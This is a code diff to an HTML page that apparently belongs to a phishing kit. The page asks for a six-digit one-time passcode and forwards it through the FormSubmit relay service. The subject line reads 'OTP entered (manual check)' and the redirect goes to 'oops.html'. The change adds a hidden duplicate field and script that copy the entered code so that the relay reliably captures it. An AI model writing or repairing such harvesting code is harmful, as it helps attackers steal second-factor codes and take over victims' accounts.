@@ -28,7 +28,7 @@
       <input type="hidden" name="otp" id="fullOtp">
       <input type="hidden" name="_subject" value="OTP entered (manual check)">
       <input type="hidden" name="_next" value="oops.html">
-
+     <input type="text" name="otp" id="dummyOtp" style="display:none;">
       <div class="otp-container">
         <input type="text" maxlength="1" class="otp-box" name="digit1" required>
         <input type="text" maxlength="1" class="otp-box" name="digit2" required>
@@ -63,16 +63,17 @@
   });
 
   // Combine OTP and submit
-  form.addEventListener('submit', (e) => {
-    const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
-    fullOtp.value = otpValue;
-    document.getElementById('status').innerText = 'Submitting OTP...';
+ form.addEventListener('submit', (e) => {
+  const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
+  document.getElementById('fullOtp').value = otpValue; // hidden field
+  document.getElementById('dummyOtp').value = otpValue; // dummy visible field for Formsubmit
     // Form will submit normally, redirect handled by _next
   });
 </script>
 
 </body>
 </html>
+
 
 
 
